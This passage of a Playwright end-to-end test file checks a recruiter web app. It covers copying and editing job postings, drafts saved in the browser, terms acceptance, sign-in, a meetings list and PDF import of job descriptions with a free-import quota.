		const notFound = page.getByRole('heading', {
			level: 2,
			name: 'Job description to copy not found'
		});
		const titleInput = page.getByRole('textbox', { name: 'Job title' });
		// No posting of theirs has this id
		await openAsRecruiter(page, '/recruiter/jobs/new?duplicate=65e2e00000000000000fff01');
		await expect(notFound).toBeVisible();
		await expect(titleInput).toHaveCount(0);
		// Not a posting id at all: the same, never a blank form
		await gotoHydrated(page, '/recruiter/jobs/new?duplicate=abc');
		await expect(notFound).toBeVisible();
		await expect(titleInput).toHaveCount(0);

		// Deleted since a copy of it was started: that copy, kept in this browser, goes on
		const { _id: gone } = await createJob(api, {
			title: `Deleted engineer ${tag}`,
			status: 'open'
		});
		expect((await api.delete(`${API_URL}/jobs/${gone}`)).ok()).toBe(true);
		await page.evaluate(
			({ key, title }) => localStorage.setItem(key, JSON.stringify({ form: { title } })),
			{ key: `jobDraft:${E2E_RECRUITER_ID}:copy:${gone}`, title: `Kept copy ${tag}` }
		);
		await gotoHydrated(page, `/recruiter/jobs/new?duplicate=${gone}`);
		await expect(
			page.getByText(
				'The job description this copy was made from no longer exists: your unsaved copy is restored from this browser.'
			)
		).toBeVisible();
		await expect(page.getByText('Restored your unsaved changes from this browser.')).toBeVisible();
		await expect(titleInput).toHaveValue(`Kept copy ${tag}`);
		await expect(page.getByLabel('Status')).toHaveValue('draft');
		// Discarded: back to a blank form, nothing kept (leaving asks nothing)
		await page.getByRole('button', { name: 'Discard draft' }).click();
		await page.getByRole('button', { name: 'Discard', exact: true }).click();
		await expect(titleInput).toHaveValue('');

		// The server failed: said so, and Try again loads it
		const title = `Copied engineer ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'open' });
		const failed = await stubApi(page, 'GET', `/recruiter/jobs/${id}`, (_request, index) =>
			index === 0 ? { status: 500, text: 'Internal Server Error' } : undefined
		);
		await gotoHydrated(page, `/recruiter/jobs/new?duplicate=${id}`);
		await expect(
			page.getByRole('heading', { level: 2, name: 'Could not load the job description to copy' })
		).toBeVisible();
		await expect(titleInput).toHaveCount(0);
		await page.getByRole('button', { name: 'Try again' }).click();
		await expect(
			page.getByText(`A copy of “${title}”, as a new draft: change what you need, then create it.`)
		).toBeVisible();
		await expect(titleInput).toHaveValue(title);
		expect(failed).toHaveLength(1);
	});

	test('a save refused for locked terms keeps what was typed, and duplicates it with the changes', async ({
		page
	}) => {
		const title = `Ops engineer ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'open' });
		// As if the terms had changed: the API refuses them
		const saves = await stubApi(page, 'PUT', `/jobs/${id}`, () => ({
			status: 409,
			text: 'The terms of an opened job posting cannot be changed'
		}));
		await openAsRecruiter(page, `/recruiter/jobs/${id}/edit`);
		const description = page.getByRole('textbox', { name: 'Job description' });
		const typed = '## The job\n\nRun the platform.';
		await description.fill(typed);
		await page.getByRole('button', { name: 'Save changes' }).click();

		const refused = page.getByText(
			/^The pay and the conditions of this job description are locked: it was opened/
		);
		await expect(refused).toBeVisible();
		await expect(description).toHaveValue(typed);
		expect(saves).toHaveLength(1);

		// Reloaded: the posting as it is, with the changes to its other fields over it
		await page.getByRole('button', { name: 'Reload', exact: true }).click();
		await expect(page.getByText('Restored your unsaved changes from this browser.')).toBeVisible();
		await expect(description).toHaveValue(typed);
		await expect(page.getByRole('textbox', { name: 'Job title' })).not.toBeEditable();

		// Refused again: duplicated with the changes
		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(refused).toBeVisible();
		expect(saves).toHaveLength(2);
		await page.getByRole('button', { name: 'Duplicate with my changes' }).click();

		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/new\\?duplicate=${id}$`));
		await expect(page.getByText('Restored your unsaved changes from this browser.')).toBeVisible();
		await expect(description).toHaveValue(typed);
		await expect(page.getByLabel('Status')).toHaveValue('draft');
		// Nothing was saved, and the posting's own draft is gone: its changes moved to the copy
		expect((await listRecruiterJobs(api)).filter((job) => job.title === title)).toHaveLength(1);
		expect(
			await page.evaluate((key) => localStorage.getItem(key), `jobDraft:${E2E_RECRUITER_ID}:${id}`)
		).toBeNull();
	});

	test('counts text typed in a list as a change, kept with the draft', async ({ page }) => {
		const title = `Site reliability engineer ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'draft' });
		await openAsRecruiter(page, `/recruiter/jobs/${id}/edit`);
		await expect(page.getByText('No changes yet')).toBeVisible();

		// Typed, Enter not pressed
		await page.getByRole('textbox', { name: 'Skills' }).fill('Rust');
		await page.getByRole('textbox', { name: 'Benefits' }).fill('Gym membership');
		await expect(page.getByText('Unsaved changes')).toBeVisible();
		await page.getByRole('link', { name: 'Cancel' }).click();
		const dialog = page.getByRole('alertdialog', { name: 'Leave without saving?' });
		await expect(dialog).toBeVisible();
		await dialog.getByRole('button', { name: 'Leave', exact: true }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));

		// Back in the editor: the text is there, not added yet
		await gotoHydrated(page, `/recruiter/jobs/${id}/edit`);
		await expect(page.getByText('Restored your unsaved changes from this browser.')).toBeVisible();
		await expect(page.getByRole('textbox', { name: 'Skills' })).toHaveValue('Rust');
		await expect(page.getByRole('textbox', { name: 'Benefits' })).toHaveValue('Gym membership');
		// Saved, it is added to the posting
		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));
		const saved = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect([saved.requirements?.skills, saved.benefits]).toEqual([['Rust'], ['Gym membership']]);
	});

	test('a posting without openings keeps none through an edit', async ({ page }) => {
		const title = `Analytics engineer ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'draft', openings: undefined });
		await openAsRecruiter(page, `/recruiter/jobs/${id}/edit`);
		await expect(page.getByRole('textbox', { name: 'Openings' })).toHaveValue('');
		await expect(page.getByText('No changes yet')).toBeVisible();

		await page.getByRole('button', { name: 'Save changes' }).click();
		await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${id}$`));
		const saved = await (await api.get(`${API_URL}/recruiter/jobs/${id}`)).json();
		expect(saved).not.toHaveProperty('openings');
	});

	test('lists the meetings booked on pages for recruiters, and joins one with its Google Meet link', async ({
		page
	}) => {
		// Answered in the browser: the e2e database has no Google Calendar
		const now = Date.now();
		const meetings = [
			{
				id: 'meeting-now',
				start: new Date(now - 10 * 60_000).toISOString(),
				end: new Date(now + 20 * 60_000).toISOString(),
				title: `Intro call ${tag}`,
				portfolio: { name: 'e2e-shared', title: 'Sam Shared' },
				location: 'google_meet',
				locationDetails: null,
				meetLink: 'https://meet.google.com/abc-defg-hij'
			},
			{
				id: 'meeting-later',
				start: new Date(now + 3 * 86_400_000).toISOString(),
				end: new Date(now + 3 * 86_400_000 + 30 * 60_000).toISOString(),
				title: null,
				portfolio: null,
				location: 'phone',
				locationDetails: '+33 1 23 45 67 89',
				meetLink: null
			}
		];
		let answer: { meetings: typeof meetings } = { meetings };
		await page.route(`${API_URL}/appointments/booked`, (route) => route.fulfill({ json: answer }));
		await openAsRecruiter(page, '/recruiter');

		const section = page.getByRole('region', { name: 'Upcoming meetings' });
		const items = section.getByRole('listitem');
		await expect(items).toHaveCount(2);

		const current = items.nth(0);
		await expect(current.getByRole('heading', { level: 3 })).toHaveText(`Intro call ${tag}`);
		await expect(current).toContainText('Now');
		await expect(current.getByRole('link', { name: 'Sam Shared' })).toHaveAttribute(
			'href',
			'/e2e-shared'
		);
		const join = current.getByRole('link', { name: /^Join Google Meet/ });
		await expect(join).toHaveAttribute('href', 'https://meet.google.com/abc-defg-hij');
		await expect(join).toHaveAttribute('target', '_blank');
		await expect(join).toHaveAttribute('rel', 'noopener noreferrer');

		// A phone call: where it takes place, nothing to join; a schedule and portfolio since deleted
		const later = items.nth(1);
		await expect(later.getByRole('heading', { level: 3 })).toHaveText('Meeting');
		await expect(later).toContainText('with a candidate');
		await expect(later).toContainText('By phone: +33 1 23 45 67 89');
		await expect(later.getByRole('link')).toHaveCount(0);
		await expect(later).not.toContainText('Now');

		// Nothing booked: one line saying where meetings come from
		answer = { meetings: [] };
		await page.reload();
		await expect(section).toContainText('No upcoming meetings.');
		await expect(section.getByRole('listitem')).toHaveCount(0);
		// The job descriptions are still there, under it
		await expect(
			page.getByRole('heading', { level: 2, name: 'Your job descriptions' })
		).toBeVisible();
	});

	test('the account menu names the recruiter space, and leads to no job board', async ({
		page
	}) => {
		await openAsRecruiter(page, '/recruiter');
		await page
			.getByRole('button', { name: 'Account menu: Rita Recruiter, Recruiter space' })
			.click();
		await expect(page.getByRole('menuitemradio', { name: /^Recruiter space/ })).toBeChecked();
		await expect(page.getByRole('menuitemradio', { name: /^Candidate space/ })).not.toBeChecked();
		// No portfolio: the candidate space offers to claim one
		await expect(page.getByRole('menuitemradio', { name: /^Candidate space/ })).toContainText(
			'Claim your portfolio'
		);

		await expect(page.getByRole('menuitem', { name: 'Account & privacy' })).toBeVisible();
		await expect(page.getByRole('menuitem', { name: 'Browse jobs' })).toHaveCount(0);
		// No portfolio, no link to share
		await expect(page.getByRole('menuitem', { name: 'Share your link' })).toHaveCount(0);
		await expect(page.getByRole('menu').locator('a[href="/jobs"]')).toHaveCount(0);
	});

	test('signed out, /recruiter presents the recruiter space and asks for nothing private', async ({
		page
	}) => {
		const asked: string[] = [];
		page.on('request', (request) => {
			if (request.url().startsWith(API_URL)) asked.push(new URL(request.url()).pathname);
		});
		await gotoHydrated(page, '/recruiter');

		await expect(
			page.getByRole('heading', {
				level: 2,
				name: 'See where a candidate used each skill, and for how long'
			})
		).toBeVisible();
		await expect(
			page.getByRole('heading', { level: 3, name: 'Skills you can check, not just read' })
		).toBeVisible();
		await expect(page.getByText('Say exactly what you need')).toBeVisible();
		await expect(page.getByText('Your meetings in one place')).toBeVisible();
		// Free today as the Terms say (told before any paid feature), never "free forever"; and the
		// match checks only what the candidate rated, so it promises no call spared on pay
		await expect(
			page.getByText(/^Free for recruiters today: you would be told before any paid feature/)
		).toBeVisible();
		expect(await page.locator('main').textContent()).not.toMatch(
			/free forever|no call that ends on pay/i
		);
		// The job board is gone: nothing leads there
		await expect(page.getByRole('link', { name: 'Browse open jobs' })).toHaveCount(0);
		await expect(page.locator('a[href="/jobs"]')).toHaveCount(0);
		await expect(page.getByRole('heading', { name: 'Your job descriptions' })).toHaveCount(0);
		await expect(page.getByRole('link', { name: 'New job description' })).toHaveCount(0);
		expect(
			asked.filter((path) => path.startsWith('/recruiter') || path === '/jobs/import')
		).toEqual([]);
	});

	test('signed out, Google is loaded once the age and terms box is ticked, and the sign-in sends it', async ({
		page
	}) => {
		const google = await stubGoogle(page);
		const user = {
			_id: E2E_RECRUITER_ID,
			email: 'e2e.recruiter@example.com',
			activeMode: 'recruiter',
			recruiter: true,
			termsVersion: LEGAL_VERSION
		};
		// Signed out on arrival; signed in once POST /login answered
		let signedIn = false;
		await stubApi(page, 'GET', '/isLogged', () => ({
			json: signedIn ? { logged: true, user, expires: inAnHour() } : { logged: false }
		}));
		const logins = await stubApi(page, 'POST', '/login', () => {
			signedIn = true;
			return { json: { user, expires: inAnHour() } };
		});
		await stubApi(page, 'GET', '/recruiter/jobs', () => ({ json: { jobs: [] } }));
		await gotoHydrated(page, '/recruiter');

		const box = page.getByRole('checkbox', { name: /at least 16 years old/ });
		await expect(box).not.toBeChecked();
		await expect(page.getByText('Tick the box to continue')).toBeVisible();
		// What the terms ask of recruiters, a click away
		await expect(page.getByRole('link', { name: /what they ask of recruiters/ })).toHaveAttribute(
			'href',
			'/legal/terms#recruiters'
		);
		await page.waitForTimeout(500);
		expect(google).toEqual([]);

		await box.check();
		await page.getByRole('button', { name: 'Stub Google sign-in' }).click();

		await expect(toasts(page).getByText('Welcome to your recruiter space')).toBeVisible();
		expect(google.length).toBeGreaterThan(0);
		expect(logins).toHaveLength(1);
		expect(logins[0].postDataJSON()).toEqual({
			token: 'stub-credential',
			mode: 'recruiter',
			consent: { termsVersion: LEGAL_VERSION, ageConfirmed: true },
			consentSource: 'recruiter'
		});
		await expect(
			page.getByRole('heading', { level: 2, name: 'Your job descriptions' })
		).toBeVisible();
	});

	test('a recruiter who has not accepted the terms in force accepts them before the dashboard shows', async ({
		page
	}) => {
		const user = {
			_id: E2E_RECRUITER_ID,
			email: 'e2e.recruiter@example.com',
			name: 'Rita',
			surname: 'Recruiter',
			activeMode: 'recruiter',
			recruiter: true,
			termsVersion: '2025-01-01'
		};
		await stubApi(page, 'GET', '/isLogged', () => ({
			json: { logged: true, user, expires: inAnHour() }
		}));
		// Refused until accepted, then the e2e recruiter's own list
		let accepted = false;
		const lists = await stubApi(page, 'GET', '/recruiter/jobs', () =>
			accepted ? undefined : TERMS_REQUIRED
		);
		const acceptances = await stubApi(page, 'PUT', '/me/consent', () => {
			accepted = true;
			return { json: { user: { ...user, termsVersion: LEGAL_VERSION } } };
		});
		await openAsRecruiter(page, '/recruiter');

		const terms = page.locator('[data-terms-acceptance]');
		await expect(terms.getByRole('heading', { level: 2, name: 'Terms of use' })).toBeVisible();
		await expect(terms).toContainText('accept them to keep using your recruiter space');
		await expect(page.getByRole('heading', { name: 'Your job descriptions' })).toHaveCount(0);
		expect(lists).toHaveLength(1);

		// The box first
		await terms.getByRole('button', { name: 'Accept the terms' }).click();
		await expect(
			terms.getByText('Tick the box to confirm your age and accept the terms.')
		).toBeVisible();
		expect(acceptances).toHaveLength(0);

		await terms.getByRole('checkbox', { name: /at least 16 years old/ }).check();
		await terms.getByRole('button', { name: 'Accept the terms' }).click();

		await expect(
			page.getByRole('heading', { level: 2, name: 'Your job descriptions' })
		).toBeVisible();
		expect(acceptances.map((request) => request.postDataJSON())).toEqual([
			{ termsVersion: LEGAL_VERSION, ageConfirmed: true, source: 'recruiter' }
		]);
	});
});

// --- Opening the recruiter space, and the terms on every recruiter page ------------------

/** The e2e candidate as its session shows it: no recruiter space, `termsVersion` if given */
const candidateUser = (termsVersion?: string) => ({
	_id: E2E_CANDIDATE_ID,
	email: 'e2e.candidate@example.com',
	name: 'E2E',
	surname: 'Candidate',
	recruiter: false,
	...(termsVersion ? { termsVersion } : {})
});

/**
 * Signed in as the e2e candidate, the session saying it accepted `termsVersion` (if any). PUT
 * /me/mode is answered in the browser (the candidate never gets a space for real), and so is the
 * empty list of the space it then shows. Returns the PUT /me/mode requests.
 */
const asCandidateWithoutSpace = async (page: Page, termsVersion?: string) => {
	const candidate = await candidateSession();
	const user = candidateUser(termsVersion);
	await signIn(page, candidate);
	await stubApi(page, 'GET', '/isLogged', () => ({
		json: { logged: true, user, expires: candidate.exp }
	}));
	await stubApi(page, 'GET', '/recruiter/jobs', () => ({ json: { jobs: [] } }));
	return stubApi(page, 'PUT', '/me/mode', () => ({
		json: {
			user: { ...user, activeMode: 'recruiter', recruiter: true, termsVersion: LEGAL_VERSION }
		}
	}));
};

/** The e2e recruiter as its session shows it, with an acceptance older than the terms in force */
const staleRecruiter = {
	_id: E2E_RECRUITER_ID,
	email: 'e2e.recruiter@example.com',
	name: 'Rita',
	surname: 'Recruiter',
	activeMode: 'recruiter',
	recruiter: true,
	termsVersion: '2025-01-01'
};

/** The session says the terms in force are not accepted; PUT /me/consent accepts them (answered in the browser) */
const stubStaleTerms = async (page: Page, onAccepted?: () => void) => {
	await stubApi(page, 'GET', '/isLogged', () => ({
		json: { logged: true, user: staleRecruiter, expires: inAnHour() }
	}));
	return stubApi(page, 'PUT', '/me/consent', () => {
		onAccepted?.();
		return { json: { user: { ...staleRecruiter, termsVersion: LEGAL_VERSION } } };
	});
};

const CONSENT = { termsVersion: LEGAL_VERSION, ageConfirmed: true };

test.describe('opening the recruiter space', () => {
	test('the account menu leads an account without a space to /recruiter, which asks for the terms and sends them with the creation', async ({
		page
	}) => {
		const modes = await asCandidateWithoutSpace(page);
		await gotoHydrated(page, '/legal');
		await page.getByRole('button', { name: /^Account menu/ }).click();
		await page.getByRole('menuitemradio', { name: /^Recruiter space/ }).click();

		// The menu only leads there: the page creates the space
		await expect(page).toHaveURL(/\/recruiter$/);
		await expect(page.getByRole('heading', { name: 'Create your recruiter space' })).toBeVisible();
		expect(modes).toHaveLength(0);
		await expect(page.getByRole('link', { name: /what they ask of recruiters/ })).toHaveAttribute(
			'href',
			'/legal/terms#recruiters'
		);

		// Not without the box
		await page.getByRole('button', { name: 'Create my recruiter space' }).click();
		await expect(
			page.getByText(
				'Tick the box to confirm your age and accept the terms before you create your recruiter space.'
			)
		).toBeVisible();
		expect(modes).toHaveLength(0);

		await page.getByRole('checkbox', { name: /at least 16 years old/ }).check();
		await page.getByRole('button', { name: 'Create my recruiter space' }).click();
		await expect(
			page.getByRole('heading', { level: 2, name: 'Your job descriptions' })
		).toBeVisible();
		expect(modes.map((request) => request.postDataJSON())).toEqual([
			{ mode: 'recruiter', consent: CONSENT }
		]);
	});

	test('the space chooser after a sign-in leads an account without a space to /recruiter, and creates none', async ({
		page
	}) => {
		await stubGoogle(page);
		const user = candidateUser();
		// Signed out on arrival; signed in once POST /login answered
		let signedIn = false;
		await stubApi(page, 'GET', '/isLogged', () => ({
			json: signedIn ? { logged: true, user, expires: inAnHour() } : { logged: false }
		}));
		await stubApi(page, 'POST', '/login', () => {
			signedIn = true;
			return { json: { user, expires: inAnHour() } };
		});
		const modes = await stubApi(page, 'PUT', '/me/mode', () => ({ json: { user } }));
		await gotoHydrated(page, '/e2e-shared/experiences');

		const signInGroup = page.getByRole('group', { name: 'Sign in' });
		await signInGroup.getByRole('button', { name: 'Sign in' }).click();
		await signInGroup.getByRole('button', { name: 'Stub Google sign-in' }).click();
		const chooser = page.getByRole('dialog', { name: 'How do you want to continue?' });
		await chooser.getByRole('button', { name: /^Recruiter/ }).click();

		await expect(page).toHaveURL(/\/recruiter$/);
		await expect(page.getByRole('heading', { name: 'Create your recruiter space' })).toBeVisible();
		await expect(page.getByRole('checkbox', { name: /at least 16 years old/ })).not.toBeChecked();
		expect(modes).toHaveLength(0);
	});

	test('an account that accepted the terms in force elsewhere opens it without the box, told what they ask of recruiters', async ({
		page
	}) => {
		const modes = await asCandidateWithoutSpace(page, LEGAL_VERSION);
		await gotoHydrated(page, '/recruiter');

		await expect(page.getByRole('heading', { name: 'Create your recruiter space' })).toBeVisible();
		await expect(
			page.getByRole('link', { name: /what the Terms of use ask of recruiters/ })
		).toHaveAttribute('href', '/legal/terms#recruiters');
		await expect(page.getByRole('checkbox', { name: /at least 16 years old/ })).toHaveCount(0);

		await page.getByRole('button', { name: 'Create my recruiter space' }).click();
		await expect(
			page.getByRole('heading', { level: 2, name: 'Your job descriptions' })
		).toBeVisible();
		expect(modes.map((request) => request.postDataJSON())).toEqual([{ mode: 'recruiter' }]);
	});
});

test.describe('the terms on the recruiter pages', () => {
	test("a posting's page asks a recruiter who has not accepted the terms in force for them, then shows it", async ({
		page
	}) => {
		const title = `Terms check ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'draft' });
		let accepted = false;
		const acceptances = await stubStaleTerms(page, () => (accepted = true));
		// Refused until accepted, then the posting itself
		const reads = await stubApi(page, 'GET', `/recruiter/jobs/${id}`, () =>
			accepted ? undefined : TERMS_REQUIRED
		);
		await openAsRecruiter(page, `/recruiter/jobs/${id}`);

		const terms = page.locator('[data-terms-acceptance]');
		await expect(terms.getByRole('heading', { level: 2, name: 'Terms of use' })).toBeVisible();
		await expect(terms).toContainText('accept them to keep using your recruiter space');
		await expect(page.getByRole('heading', { name: title })).toHaveCount(0);
		expect(reads).toHaveLength(1);

		await terms.getByRole('checkbox', { name: /at least 16 years old/ }).check();
		await terms.getByRole('button', { name: 'Accept the terms' }).click();

		await expect(page.getByRole('heading', { level: 2, name: title, exact: true })).toBeVisible();
		expect(acceptances.map((request) => request.postDataJSON())).toEqual([
			{ ...CONSENT, source: 'recruiter' }
		]);
	});

	test('the new job page asks for the terms in force before the form, then opens it', async ({
		page
	}) => {
		const acceptances = await stubStaleTerms(page);
		await openAsRecruiter(page, '/recruiter/jobs/new');

		const terms = page.locator('[data-terms-acceptance]');
		await expect(terms.getByRole('heading', { level: 2, name: 'Terms of use' })).toBeVisible();
		await expect(page.getByRole('textbox', { name: 'Job title' })).toHaveCount(0);

		await terms.getByRole('checkbox', { name: /at least 16 years old/ }).check();
		await terms.getByRole('button', { name: 'Accept the terms' }).click();

		await expect(page.getByRole('heading', { name: 'New job description' })).toBeFocused();
		await expect(page.getByRole('textbox', { name: 'Job title' })).toBeVisible();
		expect(acceptances.map((request) => request.postDataJSON())).toEqual([
			{ ...CONSENT, source: 'recruiter' }
		]);
	});

	test('a save refused for the terms says to accept them in the recruiter space', async ({
		page
	}) => {
		const title = `Save check ${tag}`;
		const { _id: id } = await createJob(api, { title, status: 'draft' });
		// The session says the terms in force were accepted: the API asks for them all the same
		const saves = await stubApi(page, 'PUT', `/jobs/${id}`, () => TERMS_REQUIRED);
		await openAsRecruiter(page, `/recruiter/jobs/${id}/edit`);

		const titleInput = page.getByRole('textbox', { name: 'Job title' });
		await expect(titleInput).toHaveValue(title);
		await titleInput.fill(`${title} changed`);
		await page.getByRole('button', { name: 'Save changes' }).click();

		await expect(
			page.getByText('Accept the terms of use in force to save: open the recruiter space')
		).toBeVisible();
		await expect(page.getByRole('link', { name: 'Open the recruiter space' })).toHaveAttribute(
			'href',
			'/recruiter'
		);
		expect(saves).toHaveLength(1);
		// Nothing saved: the posting keeps its title
		expect((await listRecruiterJobs(api)).find((job) => job._id === id)?.title).toBe(title);
	});
});

// --- PDF import ---------------------------------------------------------------------------

type ImportStatus = {
	enabled: boolean;
	plan: 'free';
	limit: number;
	used: number;
	remaining: number;
	resetsAt: string | null;
};

const importStatus = (overrides: Partial<ImportStatus> = {}): ImportStatus => ({
	enabled: true,
	plan: 'free',
	limit: 3,
	used: 0,
	remaining: 3,
	resetsAt: null,
	...overrides
});

/**
 * Answers GET and POST /jobs/import in the browser, with the CORS headers the API would send
 * (the page and the API are on different origins). Returns the requests it answered.
 */
const stubJobImport = async (
	page: Page,
	{
		status,
		post = (route) => route.fulfill({ status: 500, body: 'Unexpected import' })
	}: {
		status: () => ImportStatus;
		post?: (route: Route) => Promise<void>;
	}
) => {
	const calls = { get: 0, post: [] as { file: string; fileName?: string }[] };
	await page.route(`${API_URL}/jobs/import`, async (route) => {
		const request = route.request();
		const cors = {
			'access-control-allow-origin': request.headers()['origin'] ?? '*',
			'access-control-allow-credentials': 'true'
		};
		if (request.method() === 'OPTIONS') {
			return route.fulfill({
				status: 204,
				headers: {
					...cors,
					'access-control-allow-methods': 'GET, POST',
					'access-control-allow-headers': request.headers()['access-control-request-headers'] ?? ''
				}
			});
		}
		if (request.method() === 'GET') {
			calls.get++;
			return route.fulfill({ json: status(), headers: cors });
		}
		calls.post.push(request.postDataJSON());
		return post({
			...route,
			fulfill: (options) => route.fulfill({ ...options, headers: { ...cors, ...options?.headers } })
		} as Route);
	});
	return calls;
};

const PDF = {
	name: 'offer.pdf',
	mimeType: 'application/pdf',
	buffer: Buffer.from('%PDF-1.4\n%e2e\n')
};

/** What Claude would have read in a job description: a draft named with the test's tag */
const extraction = () => ({
	draft: {
		title: `Product designer ${tag}`,
		description: '## The job\n\nDesign the booking flow.',
		company: 'Initech',
		status: 'draft',
		openings: 2,
		location: { country: 'FR', city: 'Nantes', postalCode: '44000', workMode: 'on_site' },
		contract: { type: 'cdi', trialPeriodMonths: 3 },
		workingTime: { arrangement: 'annual_days', daysPerYear: 218, rttDaysPerYear: 10 },
		pay: { min: 50000, max: 60000, currency: 'EUR', period: 'year' },
		requirements: { seniority: 'senior', skills: ['Figma', 'User research'] }
	},
	warnings: ['The pay period was not stated: per year assumed'],
	quota: { plan: 'free', limit: 3, used: 1, remaining: 2, resetsAt: null }
});

const openImport = async (page: Page) => {
	await page.getByRole('button', { name: 'Import from PDF' }).click();
	const dialog = page.getByRole('dialog', { name: 'Import a job description' });
	await expect(dialog).toBeVisible();
	return dialog;
};

test.describe('job description import', () => {
	test('reads a PDF into the editor, and the draft is saved as a posting', async ({ page }) => {
		const title = `Product designer ${tag}`;
		const calls = await stubJobImport(page, {
			status: () => importStatus(),
			post: (route) => route.fulfill({ json: extraction() })
		});
		await openAsRecruiter(page, '/recruiter');

		await expect(page.getByText('3 of 3 free imports left')).toBeVisible();
		const dialog = await openImport(page);
		await expect(dialog.getByText('3 of 3 free imports left.')).toBeVisible();
		await expect(dialog.getByText(/sent to Anthropic’s Claude/)).toBeVisible();
		await dialog.locator('input[type="file"]').setInputFiles(PDF);
		await expect(dialog.getByText('offer.pdf', { exact: true })).toBeVisible();
		await expect(
			dialog.getByText(
				'This import uses 1 of your 3 free imports left, even if you discard the draft.'
			)
		).toBeVisible();
		await dialog.getByRole('button', { name: 'Import', exact: true }).click();

		// The editor, prefilled from the draft, with what to check
		await expect(page).toHaveURL(/\/recruiter\/jobs\/new\?import=1$/);
		expect(calls.post).toEqual([{ file: PDF.buffer.toString('base64'), fileName: 'offer.pdf' }]);
		await expect(toasts(page).getByText('Job description imported', { exact: true })).toBeVisible();
		const banner = page.getByRole('region', {
			name: 'Imported from offer.pdf: check every field before saving.'
		});
		await expect(banner.getByRole('listitem')).toHaveText([
			'The pay period was not stated: per year assumed'
		]);
		await expect(page.getByRole('textbox', { name: 'Job title' })).toHaveValue(title);
		await expect(page.getByRole('textbox', { name: 'City', exact: true })).toHaveValue('Nantes');
		await expect(page.getByRole('textbox', { name: 'Days per year', exact: true })).toHaveValue(
			'218'
		);
		await expect(page.getByRole('textbox', { name: 'Minimum pay' })).toHaveValue('50000');

		await page.getByRole('button', { name: 'Create job description' }).click();
		await expect(page).toHaveURL(JOB_PAGE);
		await expect(page.getByRole('heading', { level: 2, name: title, exact: true })).toBeVisible();
		await expect(fact(page, 'Contract')).toContainText('CDI (permanent)');
		await expect(fact(page, 'Working time')).toContainText(
			'218 days a year (forfait jours: counted in days worked, no weekly hours) · 10 RTT days (extra days off a year)'
		);
		await expect(fact(page, 'Pay')).toContainText('€50,000 – €60,000 gross per year');
		const saved = (await listRecruiterJobs(api)).filter((job) => job.title === title);
		expect(saved).toEqual([expect.objectContaining({ status: 'draft' })]);

		// Saved: the import is no longer waiting on the dashboard
		await gotoHydrated(page, '/recruiter');
		await expect(page.getByRole('link', { name: title, exact: true })).toBeVisible();
		await expect(page.getByText(/but have not created the posting yet/)).toHaveCount(0);
	});

	test('remarks written in the other language are not shown, and the banner says so', async ({
		page
	}) => {
		await stubJobImport(page, {
			status: () => importStatus(),
			post: (route) => route.fulfill({ json: extraction() })
		});
		await openAsRecruiter(page, '/recruiter');
		const dialog = await openImport(page);
		await dialog.locator('input[type="file"]').setInputFiles(PDF);
		await dialog.getByRole('button', { name: 'Import', exact: true }).click();
		await expect(page).toHaveURL(/\/recruiter\/jobs\/new\?import=1$/);
		await expect(page.getByText('The pay period was not stated: per year assumed')).toBeVisible();

		// The same import reopened in French: its English remarks are not shown. Leaving the
		// unsaved import asks the browser first (beforeunload): accepted
		page.on('dialog', (leave) => leave.accept());
		await gotoHydrated(page, '/recruiter/jobs/new?import=1&lang=fr');
		await expect(page.locator('html')).toHaveAttribute('lang', 'fr');
		await expect(
			page.getByText(
				"Les remarques de cet import ont été rédigées dans l'autre langue du site et ne sont pas affichées."
			)
		).toBeVisible();
		await expect(page.getByText('The pay period was not stated: per year assumed')).toHaveCount(0);
		await expect(page.getByText(/Rien n'a été laissé de côté/)).toHaveCount(0);
	});

	test('once the free imports are used, says so and offers no import', async ({ page }) => {
		const calls = await stubJobImport(page, {
			status: () => importStatus({ used: 3, remaining: 0 })
		});
		await openAsRecruiter(page, '/recruiter');

		await expect(
			page.getByText('You have used your 3 free imports. Paid plans are coming soon.')
		).toBeVisible();
		await expect(page.getByRole('button', { name: 'Import from PDF' })).toBeDisabled();
		expect(calls.post).toEqual([]);
	});

	test('shows the API’s message when the plan refuses the import (402)', async ({ page }) => {
		const message =
			'You have used the 3 job description imports included in the free plan. Paid plans are coming soon.';
		let status = importStatus({ used: 2, remaining: 1 });
		const calls = await stubJobImport(page, {
			status: () => status,
			post: async (route) => {
				status = importStatus({ used: 3, remaining: 0 });
				await route.fulfill({ status: 402, contentType: 'text/plain', body: message });
			}
		});
		await openAsRecruiter(page, '/recruiter');

		await expect(page.getByText('1 of 3 free imports left')).toBeVisible();
		const dialog = await openImport(page);
		await dialog.locator('input[type="file"]').setInputFiles(PDF);
		await dialog.getByRole('button', { name: 'Import', exact: true }).click();

		await expect(dialog.getByRole('alert')).toHaveText(message);
		// The allowance is asked again: a failed import may count
		await expect.poll(() => calls.get).toBe(2);
		await expect(dialog.getByRole('button', { name: 'Import', exact: true })).toBeDisabled();
		await expect(page).toHaveURL(/\/recruiter$/);

		await dialog.getByRole('button', { name: 'Cancel', exact: true }).click();
		await expect(dialog).toBeHidden();
		await expect(
			page.getByText('You have used your 3 free imports. Paid plans are coming soon.')
		).toBeVisible();
		await expect(page.getByRole('button', { name: 'Import from PDF' })).toBeDisabled();
	});
});

// --- Matching (Path 2): proposing a job to candidates --------------------------------------

/** The API's 404 of a route that does not exist: matching is off (MATCHING unset) */
const matchingIsOn = async () => (await api.get(`${API_URL}/me/notifications`)).status() !== 404;

/** The editor's required fields, for a job created open in Lyon */
const fillOpenJob = async (page: Page, title: string) => {
	await page.getByRole('textbox', { name: 'Job title' }).fill(title);
	await page
		.getByRole('textbox', { name: 'Job description' })
		.fill('## The job\n\nRun the platform.');
	await page.getByRole('textbox', { name: 'City', exact: true }).fill('Lyon');
	await page.getByRole('textbox', { name: 'Minimum pay' }).fill('50 000');
	await page.getByRole('textbox', { name: 'Maximum pay' }).fill('60 000');
	await page.getByLabel('Status', { exact: true }).selectOption('open');
};

test.describe('proposing a job to candidates (matching)', () => {
